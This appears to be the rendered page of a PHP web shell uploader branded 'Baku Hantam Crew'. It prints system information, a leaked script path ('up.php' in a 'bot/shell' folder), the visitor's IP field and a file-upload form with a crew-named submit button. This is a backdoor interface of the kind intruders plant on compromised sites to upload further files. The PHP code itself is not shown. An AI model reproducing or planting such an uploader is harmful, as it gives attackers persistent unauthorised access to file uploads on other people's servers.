<img class=" height="200" src="https://i.ibb.co/64PG4Zp/images.png"/>
<title>
Baku Hantam Crew 
</title>
<font face="Courier new" color="white" size="6">
| @ROOT_ByME |</font>
<style>
body {
	background: #000000;
	font-size: 0;
	}
h1 {
	font-size: 12px;
	}

</style>
<h1>
<big><font color=red> System: <span style="color: lime;">Linux localhost 4.14.190-perf-g9365b7d6fb08 #1 SMP PREEMPT Thu Mar 16 15:23:57 WIB 2023 aarch64</span></big><br>
Warning: Undefined array key "REMOTE_ADDR" in /storage/emulated/0/bot/shell/up.php on line 20
<font color=red>Your IP: <font color=blue></font><br><big><font color=red>Directory: <span style="color: aqua;">/storage/emulated/0/bot/shell</span></big><br><br><form method=post enctype=multipart/form-data>
<input type=file name=f>
<input name=v type=submit id=v value=BAKUHANTAMCREW> 
<br>